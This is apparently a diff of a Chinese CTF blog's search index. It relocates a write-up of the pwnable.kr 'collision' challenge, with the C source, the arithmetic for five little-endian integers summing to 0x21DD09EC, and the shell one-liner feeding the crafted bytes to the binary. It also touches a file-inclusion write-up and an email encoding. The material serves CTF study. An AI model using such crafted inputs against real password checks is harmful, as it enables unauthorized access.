-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个简单的加密函数逆向的题目</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;		<span class="comment">//一个int型占4字节，所以类型转换后20字节的字符被分成了5个int型数字</span></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];	<span class="comment">//刚好循环5次，将5个数字累加起来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;		<span class="comment">//运行程序时需要传入一个外部参数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;		<span class="comment">//该外部参数长度必须等于20字节</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;		<span class="comment">//如果外部参数的值等于hashcode则打印flag</span></span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过分析上诉代码可以知道我们只要输入5个数字，并控制他们的和等于<code>0x21DD09EC</code>即可。</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为<code>0x21DD09EC</code>不能被5整除，所以加一整除后再从某个数据中减一即可。</p>
-<p>所以我们要输入的5个数字的值为：<strong>0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC8</strong></p>
-<p>这里我们需要将16进制数转码为字符，4字节一组，表示一个16进制数，注意是小端序，所以要逆序写：</p>
-<p><strong>\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</strong></p>
-<p>最后借助python将这些字符作为参数传进去。</p>
-<h1 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./col `python -c &#x27;print &quot;\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br><span class="line">&quot;&#x27;`</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwnable刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含入门（web78~web81）</title>
     <url>/2022/07/25/ctfshow_web78~web81/</url>
     <content><![CDATA[<h1 id="ctfshow（web78-web81）-文件包含入门"><a href="#ctfshow（web78-web81）-文件包含入门" class="headerlink" title="ctfshow（web78~web81） 文件包含入门"></a>ctfshow（web78~web81） 文件包含入门</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（<a href="https://blog.csdn.net/qq_53142368/article/details/116594299">(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a>）</p>
@@ -1377,6 +1354,29 @@
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>collision</title>
+    <url>/2022/07/12/collision(wp)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个简单的加密函数逆向的题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;		<span class="comment">//一个int型占4字节，所以类型转换后20字节的字符被分成了5个int型数字</span></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];	<span class="comment">//刚好循环5次，将5个数字累加起来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;		<span class="comment">//运行程序时需要传入一个外部参数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;		<span class="comment">//该外部参数长度必须等于20字节</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;		<span class="comment">//如果外部参数的值等于hashcode则打印flag</span></span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过分析上诉代码可以知道我们只要输入5个数字，并控制他们的和等于<code>0x21DD09EC</code>即可。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为<code>0x21DD09EC</code>不能被5整除，所以加一整除后再从某个数据中减一即可。</p>
+<p>所以我们要输入的5个数字的值为：<strong>0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC8</strong></p>
+<p>这里我们需要将16进制数转码为字符，4字节一组，表示一个16进制数，注意是小端序，所以要逆序写：</p>
+<p><strong>\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</strong></p>
+<p>最后借助python将这些字符作为参数传进去。</p>
+<h1 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./col `python -c &#x27;print &quot;\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br><span class="line">&quot;&#x27;`</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwnable刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -2117,7 +2117,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
-<p>​    print(“     WangYihang <a href="mailto:&#119;&#x61;&#x6e;&#103;&#x79;&#x69;&#104;&#x61;&#110;&#x67;&#101;&#x72;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;">&#119;&#x61;&#x6e;&#103;&#x79;&#x69;&#104;&#x61;&#110;&#x67;&#101;&#x72;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#x77;&#97;&#x6e;&#x67;&#x79;&#105;&#x68;&#97;&#x6e;&#103;&#x65;&#x72;&#x40;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#109;">&#x77;&#97;&#x6e;&#x67;&#x79;&#105;&#x68;&#97;&#x6e;&#103;&#x65;&#x72;&#x40;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#109;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
